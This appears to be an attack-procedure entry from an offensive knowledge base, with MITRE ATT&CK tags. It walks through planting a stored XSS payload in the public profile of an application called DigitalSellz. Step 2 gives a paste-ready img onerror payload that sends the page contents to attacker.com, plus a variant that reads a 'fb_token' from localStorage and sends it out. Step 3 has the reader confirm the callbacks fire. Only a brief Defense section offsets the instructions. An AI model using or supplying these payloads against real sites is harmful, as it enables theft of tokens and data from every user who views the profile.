---
tags:
  - xss
  - stored-xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: acc4b829-7cc6-4bf1-a42e-6cde6515e702
created_at: '2025-12-14T03:16:14.458Z'
updated_at: '2025-12-14T03:16:14.458Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Stored-XSS-Payload-in-Public-Profile

## Summary

This procedure exploits a stored XSS vulnerability in the DigitalSellz public profile feature by injecting a malicious JavaScript payload that bypasses the application's input sanitization, allowing persistent script storage for later execution on profile views.

## Description

In the DigitalSellz application, the public profile editing functionality fails to properly sanitize user inputs, enabling attackers to insert executable JavaScript. The vulnerability, reported in 2016, allows payloads to evade filters (e.g., via event attributes or encoding). Once injected, the script is stored server-side and renders in the HTML of any page displaying the profile, executing in the context of viewing users. This is particularly dangerous in social or marketplace apps like DigitalSellz, where profiles are publicly viewable. Prerequisites include a valid user account; no advanced access is needed. Expected outcomes include successful payload persistence and execution confirmation via self-testing.

## Requirements

1. Valid user account on DigitalSellz (obtainable via free registration)
2. Web browser with developer console for payload testing
3. Knowledge of basic JavaScript and XSS evasion techniques

## Defense

Defensive measures and detection strategies:

- Implement comprehensive input validation and output encoding (e.g., CSP headers, HTML entity encoding)
- Use Content Security Policy (CSP) to restrict inline scripts
- Monitor for anomalous script injections via WAF logs and audit profile content regularly

## Objectives

1. Persist malicious JavaScript in the public profile
2. Bypass existing XSS filters without triggering errors
3. Confirm payload storage for subsequent exploitation

## Instructions

### Step 1: Register and Access Profile Editor

**Context**: Gain initial access to the vulnerable feature by creating an account and navigating to the profile settings.

Log in to DigitalSellz and go to the public profile edit page (typically under user settings or dashboard).

### Step 2: Craft and Inject Payload

**Context**: Design a payload that evades sanitization, such as using onerror events or alternative tags, and insert it into a text field like the bio or description.

Enter the following example payload in the profile field:

```html
<img src="x" onerror="fetch('http://attacker.com/log?data='+encodeURIComponent(document.body.innerHTML));">
```

Adapt for Facebook token: Replace with `var token = localStorage.getItem('fb_token'); fetch('http://attacker.com/steal?token='+token);`. Save the profile.

> This injects the script without alerting filters; test by viewing the profile in a new tab.

### Step 3: Verify Injection

**Context**: Confirm the payload is stored and executable by loading the public profile URL.

Open the profile in an incognito window or another browser. Check developer tools (F12) for network requests to your server or console errors indicating execution.

> Successful verification shows the script running, e.g., a network call to attacker.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
